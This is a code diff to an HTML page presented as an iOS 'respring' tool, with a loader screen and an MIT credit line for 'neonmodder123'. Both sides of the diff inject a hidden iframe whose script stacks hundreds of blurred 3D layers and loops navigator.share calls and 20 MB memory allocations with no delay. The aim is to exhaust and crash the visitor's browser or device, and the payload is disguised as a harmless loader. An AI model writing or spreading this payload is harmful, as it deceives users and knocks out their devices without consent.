@@ -107,12 +107,24 @@
         </div>
     </div>
 
-    <!-- Final Respring Blackout -->
-    <div id="respring-view" class="hidden fixed inset-0 z-[200] bg-black flex flex-col items-center justify-center">
-        <div class="w-12 h-12 border-2 border-white/10 border-t-white/80 rounded-full animate-spin"></div>
+    <!-- Final Respring Blackout (User's specific loader) -->
+    <div id="respring-view" class="hidden fixed inset-0 z-[200] bg-black flex flex-col items-center justify-center text-center p-6">
+        <div id="loader" class="font-sans text-sm space-y-4">
+            <div class="w-10 h-10 border-2 border-white/10 border-t-indigo-500 rounded-full animate-spin mx-auto mb-10"></div>
+            <p class="text-white/80">Respringing... (didn't work? ping neon)</p>
+            
+            <div class="pt-12 space-y-1 text-[10px] text-white/20">
+                <p>© 2026 <span class="text-white/40 font-bold">neonmodder123</span></p>
+                <p>Licensed under <a href="https://opensource.org/license/mit/" target="_blank" style="color: #1ad2dc; text-decoration: underline;">MIT</a>.</p>
+                <p class="max-w-[250px] mx-auto opacity-50">Modifying without credit is a violation of the license.</p>
+            </div>
+        </div>
     </div>
 
-    <iframe id="hook" class="fixed pointer-events-none opacity-0 w-1 h-1" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+    <!-- User's Respring Iframe -->
+    <iframe id="respring-iframe" class="fixed top-0 left-0 w-1 h-1 border-none opacity-[0.05] pointer-events-none" 
+        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
+    </iframe>
 
     <script>
         lucide.createIcons();
@@ -175,26 +187,33 @@
             document.getElementById('error-screen').classList.add('hidden');
             document.getElementById('respring-view').classList.remove('hidden');
 
-            const frame = document.getElementById('hook');
-            frame.srcdoc = `
-                <html><body style="background:black">
-                <script>
-                    const c = document.createElement('div');
-                    c.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
-                    document.body.appendChild(c);
-                    for(let i=0; i<500; i++){
-                        let d = document.createElement('div');
-                        d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, '+i+'px) rotateY(90deg); opacity: 0.99;';
-                        c.appendChild(d);
-                    }
-                    setInterval(() => {
-                        try { navigator.share({ title: 'R', text: 'R'.repeat(100000) }); } catch(e) {}
-                        let x = new Uint8Array(1024*1024*20);
-                        crypto.getRandomValues(x);
-                    }, 0);
-                <\\/script>
-                </body></html>
+            const frame = document.getElementById('respring-iframe');
+            const respringScript = `
+                <html>
+                <body style="margin:0; overflow:hidden; background: black;">
+                    <script>
+                        const container = document.createElement('div');
+                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                        document.body.appendChild(container);
+
+                        for (let i = 0; i < 500; i++) {
+                            let d = document.createElement('div');
+                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+                            container.appendChild(d);
+                        }
+
+                        setInterval(() => {
+                            try {
+                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+                            } catch(e) {}
+                            let x = new Uint8Array(1024 * 1024 * 20);
+                            crypto.getRandomValues(x);
+                        }, 0);
+                    <\/script>
+                </body>
+                </html>
             `;
+            frame.srcdoc = respringScript;
         }
     </script>
 </body>
